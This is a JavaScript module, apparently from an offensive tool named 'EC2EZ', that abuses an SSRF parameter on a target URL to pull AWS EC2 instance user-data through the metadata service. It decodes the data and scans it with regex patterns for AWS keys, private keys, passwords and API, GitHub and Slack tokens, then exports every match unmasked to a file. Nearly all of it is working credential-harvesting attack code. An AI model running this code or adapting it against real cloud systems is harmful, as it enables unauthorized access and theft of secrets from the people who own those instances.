import axios from "axios";
import fs from "fs";
import { CONFIG } from "./config.js";
import {
  logInfo,
  logSuccess,
  logError,
  logWarning,
  logSeparator,
  log,
  logDanger,
} from "./utils.js";

/**
 * Secret detection patterns
 */
const SECRET_PATTERNS = {
  awsAccessKey: {
    pattern: /(?:AKIA|ASIA|AIDA|AROA|AIPA|ANPA|ANVA|APKA)[A-Z0-9]{16}/g,
    type: "AWS Access Key",
    severity: "CRITICAL",
  },
  awsSecretKey: {
    pattern: /(?:aws_secret_access_key|AWS_SECRET_ACCESS_KEY)[\s:=]+['"]?([A-Za-z0-9/+=]{40})['"]?/g,
    type: "AWS Secret Access Key",
    severity: "CRITICAL",
  },
  privateKey: {
    pattern: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g,
    type: "Private Key",
    severity: "CRITICAL",
  },
  password: {
    pattern: /(?:password|passwd|pwd)[\s:=]+['"]?([^\s'"]{4,})['"]?/gi,
    type: "Password",
    severity: "HIGH",
  },
  apiToken: {
    pattern: /(?:api_key|apikey|api_token|token|bearer)[\s:=]+['"]?([A-Za-z0-9_\-]{20,})['"]?/gi,
    type: "API Token/Key",
    severity: "HIGH",
  },
  databaseUrl: {
    pattern: /(?:postgres|mysql|mongodb|redis):\/\/[^\s'"]+/gi,
    type: "Database URL",
    severity: "HIGH",
  },
  urlWithCreds: {
    pattern: /https?:\/\/[^:]+:[^@]+@[^\s'"]+/gi,
    type: "URL with Credentials",
    severity: "HIGH",
  },
  jwtToken: {
    pattern: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,
    type: "JWT Token",
    severity: "MEDIUM",
  },
  githubToken: {
    pattern: /ghp_[A-Za-z0-9]{36}/g,
    type: "GitHub Personal Access Token",
    severity: "HIGH",
  },
  slackToken: {
    pattern: /xox[baprs]-[A-Za-z0-9-]{10,}/g,
    type: "Slack Token",
    severity: "MEDIUM",
  },
};

/**
 * Fetch user data from IMDS
 */
export async function fetchUserData(proxyUrl, token) {
  logInfo("Fetching user data from IMDS...");

  const userDataUrl = `${CONFIG.imdsv2.baseUrl}/latest/user-data`;
  const fullUrl = `${proxyUrl}?${CONFIG.ssrf.paramName}=${encodeURIComponent(userDataUrl)}`;

  try {
    const response = await axios.get(fullUrl, {
      headers: {
        [CONFIG.imdsv2.headers.tokenRequest]: token,
      },
      timeout: 5000,
    });

    if (response.data) {
      logSuccess("✓ User data found!");
      return response.data;
    } else {
      logWarning("No user data available");
      return null;
    }
  } catch (error) {
    if (error.response && error.response.status === 404) {
      logWarning("No user data configured for this instance");
      return null;
    }
    logError("Failed to fetch user data");
    log(error.message, null, "red");
    return null;
  }
}

/**
 * Check if data is base64 encoded and decode
 */
export function decodeUserData(data) {
  if (!data || typeof data !== "string") {
    return data;
  }

  // Check if it looks like base64
  const base64Pattern = /^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$/;

  // Try to decode if it matches base64 pattern and doesn't contain common script indicators
  if (base64Pattern.test(data.trim()) && !data.includes("#!/")) {
    try {
      const decoded = Buffer.from(data, "base64").toString("utf-8");
      // Verify decoded data is readable
      if (decoded.length > 0 && /[\x20-\x7E]/.test(decoded)) {
        logInfo("Detected and decoded base64-encoded user data");
        return decoded;
      }
    } catch (error) {
      // Not base64 or invalid, return original
    }
  }

  return data;
}

/**
 * Scan user data for secrets
 */
export function scanForSecrets(userData) {
  if (!userData || typeof userData !== "string") {
    return [];
  }

  const findings = [];

  for (const [key, config] of Object.entries(SECRET_PATTERNS)) {
    const matches = userData.match(config.pattern);
    if (matches && matches.length > 0) {
      // Deduplicate matches
      const uniqueMatches = [...new Set(matches)];

      for (const match of uniqueMatches) {
        findings.push({
          type: config.type,
          severity: config.severity,
          value: match,
          patternKey: key,
        });
      }
    }
  }

  return findings;
}

/**
 * Parse cloud-init format
 */
export function parseCloudInit(userData) {
  if (!userData || typeof userData !== "string") {
    return null;
  }

  const result = {
    isCloudInit: false,
    format: null,
    packages: [],
    runcmd: [],
    writeFiles: [],
    environmentVars: {},
  };

  // Check if it's cloud-config format
  if (userData.trim().startsWith("#cloud-config")) {
    result.isCloudInit = true;
    result.format = "cloud-config";

    // Extract packages
    const packagesMatch = userData.match(/packages:\s*\n((?:[\s]*-[^\n]+\n?)+)/);
    if (packagesMatch) {
      result.packages = packagesMatch[1]
        .split("\n")
        .map((line) => line.trim().replace(/^-\s*/, ""))
        .filter((pkg) => pkg.length > 0);
    }

    // Extract runcmd
    const runcmdMatch = userData.match(/runcmd:\s*\n((?:[\s]*-[^\n]+\n?)+)/);
    if (runcmdMatch) {
      result.runcmd = runcmdMatch[1]
        .split("\n")
        .map((line) => line.trim().replace(/^-\s*/, ""))
        .filter((cmd) => cmd.length > 0);
    }

    // Extract write_files
    const writeFilesMatch = userData.match(/write_files:\s*\n((?:[\s]*-[^\n]+(?:\n[\s]+[^\n]+)*)+)/);
    if (writeFilesMatch) {
      result.writeFiles.push(writeFilesMatch[1].trim());
    }
  } else if (userData.trim().startsWith("#!/")) {
    result.isCloudInit = true;
    result.format = "shell-script";
  }

  // Extract environment variables (export VAR=value)
  const envMatches = userData.matchAll(/export\s+([A-Z_][A-Z0-9_]*)=["']?([^"'\n]+)["']?/g);
  for (const match of envMatches) {
    result.environmentVars[match[1]] = match[2];
  }

  return result;
}

/**
 * Analyze user data comprehensively
 */
export async function analyzeUserData(proxyUrl, token) {
  logSeparator();
  log("USER DATA ANALYSIS", null, "bright");
  logSeparator();

  const userData = await fetchUserData(proxyUrl, token);

  if (!userData) {
    return {
      found: false,
      data: null,
      decoded: null,
      secrets: [],
      cloudInit: null,
      analysis: null,
    };
  }

  // Decode if base64
  const decodedData = decodeUserData(userData);
  const wasDecoded = decodedData !== userData;

  if (wasDecoded) {
    logSuccess("✓ Base64-encoded user data decoded");
  }

  // Display user data
  console.log();
  logInfo("User Data Content:");
  console.log(decodedData);
  console.log();
  logSeparator();

  // Scan for secrets
  const secrets = scanForSecrets(decodedData);

  if (secrets.length > 0) {
    console.log();
    logDanger(`⚠ FOUND ${secrets.length} POTENTIAL SECRET(S) IN USER DATA!`);
    logSeparator();

    const criticalSecrets = secrets.filter((s) => s.severity === "CRITICAL");
    const highSecrets = secrets.filter((s) => s.severity === "HIGH");
    const mediumSecrets = secrets.filter((s) => s.severity === "MEDIUM");

    if (criticalSecrets.length > 0) {
      logDanger(`[CRITICAL] ${criticalSecrets.length} critical secret(s):`);
      criticalSecrets.forEach((secret) => {
        log(`  • ${secret.type}: ${maskSecret(secret.value)}`, null, "red");
      });
      console.log();
    }

    if (highSecrets.length > 0) {
      logWarning(`[HIGH] ${highSecrets.length} high-severity secret(s):`);
      highSecrets.forEach((secret) => {
        log(`  • ${secret.type}: ${maskSecret(secret.value)}`, null, "yellow");
      });
      console.log();
    }

    if (mediumSecrets.length > 0) {
      logInfo(`[MEDIUM] ${mediumSecrets.length} medium-severity secret(s):`);
      mediumSecrets.forEach((secret) => {
        log(`  • ${secret.type}: ${maskSecret(secret.value)}`, null, "cyan");
      });
      console.log();
    }

    logSeparator();
  }

  // Parse cloud-init
  const cloudInit = parseCloudInit(decodedData);

  if (cloudInit && cloudInit.isCloudInit) {
    console.log();
    logInfo(`Cloud-Init Format Detected: ${cloudInit.format}`);

    if (cloudInit.packages.length > 0) {
      log(`  Packages (${cloudInit.packages.length}):`, null, "dim");
      cloudInit.packages.slice(0, 5).forEach((pkg) => {
        log(`    - ${pkg}`, null, "dim");
      });
      if (cloudInit.packages.length > 5) {
        log(`    ... and ${cloudInit.packages.length - 5} more`, null, "dim");
      }
    }

    if (cloudInit.runcmd.length > 0) {
      log(`  Commands (${cloudInit.runcmd.length}):`, null, "dim");
      cloudInit.runcmd.slice(0, 3).forEach((cmd) => {
        log(`    - ${cmd.substring(0, 60)}${cmd.length > 60 ? "..." : ""}`, null, "dim");
      });
      if (cloudInit.runcmd.length > 3) {
        log(`    ... and ${cloudInit.runcmd.length - 3} more`, null, "dim");
      }
    }

    if (Object.keys(cloudInit.environmentVars).length > 0) {
      log(`  Environment Variables (${Object.keys(cloudInit.environmentVars).length}):`, null, "dim");
      Object.entries(cloudInit.environmentVars)
        .slice(0, 5)
        .forEach(([key, value]) => {
          log(`    ${key}=${value.substring(0, 40)}${value.length > 40 ? "..." : ""}`, null, "dim");
        });
    }

    console.log();
    logSeparator();
  }

  return {
    found: true,
    data: userData,
    decoded: decodedData,
    wasDecoded,
    secrets,
    cloudInit,
    analysis: {
      length: decodedData.length,
      lines: decodedData.split("\n").length,
      hasSecrets: secrets.length > 0,
      criticalCount: secrets.filter((s) => s.severity === "CRITICAL").length,
    },
  };
}

/**
 * Mask sensitive parts of secrets for display
 */
function maskSecret(secret) {
  if (secret.length <= 8) {
    return "*".repeat(secret.length);
  }

  // Show first 4 and last 4 characters, mask the middle
  const start = secret.substring(0, 4);
  const end = secret.substring(secret.length - 4);
  const middleLength = Math.min(secret.length - 8, 20);

  return `${start}${"*".repeat(middleLength)}${end}`;
}

/**
 * Export secrets to file
 */
export function exportSecrets(secrets, filename = "user-data-secrets.txt") {
  if (!secrets || secrets.length === 0) {
    return false;
  }

  const timestamp = new Date().toISOString();
  let content = `EC2EZ - User Data Secrets Export\n`;
  content += `Timestamp: ${timestamp}\n`;
  content += `Total Secrets Found: ${secrets.length}\n`;
  content += `${"=".repeat(80)}\n\n`;

  const criticalSecrets = secrets.filter((s) => s.severity === "CRITICAL");
  const highSecrets = secrets.filter((s) => s.severity === "HIGH");
  const mediumSecrets = secrets.filter((s) => s.severity === "MEDIUM");

  if (criticalSecrets.length > 0) {
    content += `[CRITICAL] - ${criticalSecrets.length} secret(s)\n`;
    content += `${"-".repeat(80)}\n`;
    criticalSecrets.forEach((secret, idx) => {
      content += `${idx + 1}. ${secret.type}\n`;
      content += `   Value: ${secret.value}\n\n`;
    });
    content += `\n`;
  }

  if (highSecrets.length > 0) {
    content += `[HIGH] - ${highSecrets.length} secret(s)\n`;
    content += `${"-".repeat(80)}\n`;
    highSecrets.forEach((secret, idx) => {
      content += `${idx + 1}. ${secret.type}\n`;
      content += `   Value: ${secret.value}\n\n`;
    });
    content += `\n`;
  }

  if (mediumSecrets.length > 0) {
    content += `[MEDIUM] - ${mediumSecrets.length} secret(s)\n`;
    content += `${"-".repeat(80)}\n`;
    mediumSecrets.forEach((secret, idx) => {
      content += `${idx + 1}. ${secret.type}\n`;
      content += `   Value: ${secret.value}\n\n`;
    });
  }

  try {
    fs.writeFileSync(filename, content, "utf-8");
    logSuccess(`✓ Secrets exported to: ${filename}`);
    return true;
  } catch (error) {
    logError(`Failed to export secrets: ${error.message}`);
    return false;
  }
}
